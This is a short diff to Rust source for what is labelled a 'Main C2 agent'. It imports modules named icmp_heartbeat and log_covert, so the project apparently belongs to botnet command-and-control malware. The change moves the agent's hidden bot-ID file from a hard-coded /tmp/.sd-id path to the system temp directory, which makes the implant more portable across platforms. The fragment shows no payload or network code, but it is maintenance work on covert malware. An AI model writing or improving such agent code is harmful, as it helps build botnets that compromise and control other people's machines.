@@ -23,7 +23,6 @@ use crate::icmp_heartbeat;
 use crate::log_covert;
 
 const MAX_REPOS: usize = 256;
-const BOT_ID_FILE: &str = "/tmp/.sd-id";
 
 /// Main C2 agent.
 pub struct Agent {
@@ -69,12 +68,13 @@ impl Agent {
     }
 
     fn load_or_generate_bot_id() -> String {
-        if let Ok(id) = std::fs::read_to_string(BOT_ID_FILE) {
+        let path = std::path::PathBuf::from(std::env::temp_dir()).join(".sd-id");
+        if let Ok(id) = std::fs::read_to_string(&path) {
             let id = id.trim().to_string();
             if !id.is_empty() { return id; }
         }
         let id = Self::generate_bot_id();
-        let _ = std::fs::write(BOT_ID_FILE, &id);
+        let _ = std::fs::write(&path, &id);
         id
     }
 
